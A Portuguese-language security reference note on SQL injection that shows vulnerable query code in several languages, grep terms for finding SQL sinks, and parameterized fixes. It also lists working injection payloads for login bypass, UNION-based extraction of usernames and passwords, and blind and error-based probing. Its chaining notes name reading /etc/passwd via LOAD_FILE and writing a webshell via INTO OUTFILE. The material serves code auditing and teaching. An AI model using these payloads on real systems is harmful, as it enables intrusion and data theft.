# SQL Injection (SQLi)

**Tags:** #critico #sqli #injecao #web #backend
**OWASP:** A03:2021 — Injection
**CVSS Base:** 9.8 (Crítico — não-autenticado, sem interação)

---

## 📖 O que é

SQL Injection ocorre quando input do usuário é concatenado diretamente em uma query SQL sem parametrização, permitindo ao atacante modificar a semântica da query.

---

## 🎯 Padrões de Código Vulnerável

### PHP — `mysql_query` (Legado)
```php
// ❌ VULNERÁVEL
$user = mysql_query("SELECT * FROM users WHERE id = " . $_GET['id']);

// ❌ VULNERÁVEL — mesmo com mysqli
$query = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "'";
$result = mysqli_query($conn, $query);
```

### Python — Concatenação em SQLAlchemy
```python
# ❌ VULNERÁVEL
query = f"SELECT * FROM orders WHERE user_id = {user_id}"
db.execute(query)
```

### Java — JDBC Concatenado
```java
// ❌ VULNERÁVEL
String query = "SELECT * FROM users WHERE name = '" + userName + "'";
Statement stmt = conn.createStatement();
stmt.executeQuery(query);
```

### C# / .NET
```csharp
// ❌ VULNERÁVEL
string query = "SELECT * FROM Products WHERE Name = '" + input + "'";
SqlCommand cmd = new SqlCommand(query, conn);
```

---

## 🔍 `grep_search` Táticas

```
# Sinks diretos — alta prioridade
exec(
query(
mysqli_query(
mysql_query(
executeQuery(
cursor.execute(
db.raw(
$wpdb->query(

# Concatenação com input externo
$_GET[
$_POST[
req.query.
req.body.
request.GET
request.POST
```

**Heurística de Stack:**
- PHP legado + `mysql_query` → SQLi por concatenação, probabilidade altíssima
- ORM (Laravel, Django, ActiveRecord) → verificar `.raw()`, `.extra()`, query strings customizadas

---

## 💣 Payloads de Confirmação

### Bypass de Autenticação
```sql
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x
```

### Extração de Dados (UNION-Based)
```sql
' UNION SELECT NULL, username, password FROM users--
' UNION SELECT 1, table_name, 3 FROM information_schema.tables--
```

### Blind SQLi (Boolean-Based)
```sql
' AND 1=1--   → resposta normal
' AND 1=2--   → resposta diferente = vulnerável
```

### Blind SQLi (Time-Based)
```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

### Error-Based SQLi
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
```

---

## 🔗 Second-Order SQLi

> O input entra "sanitizado", é persistido no banco, e explode quando re-lido sem nova sanitização.

```
Fluxo: Registro → banco com input aparentemente seguro
       → login/busca posterior re-usa o valor sem parametrizar → SQLi
```

**Protocolo:** sempre rastrear onde um valor salvo no banco é re-utilizado em outra query.

→ Ver: [[Second-Order Injection]]

---

## 🛡️ Correção

```python
# ✅ CORRETO — Parametrizado
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# ✅ CORRETO — ORM (Django)
User.objects.filter(id=user_id)
```

```java
// ✅ CORRETO — PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
ps.setString(1, userName);
```

```php
// ✅ CORRETO — PDO com bind
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);
```

---

## 🔗 Chain Exploits

```
SQLi + Stack Trace com query exposta → Payload preciso sem tentativa/erro
SQLi (Read File) → LOAD_FILE('/etc/passwd') → LFI via SQL
SQLi (Write File) → INTO OUTFILE → Webshell → RCE Crítico
```

---

## 📌 Referências
- [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection)
- [[PEI — Protocolo de Investigação Exploratória]]
- [[Second-Order Injection]]
- [[Matriz de Severidade]]
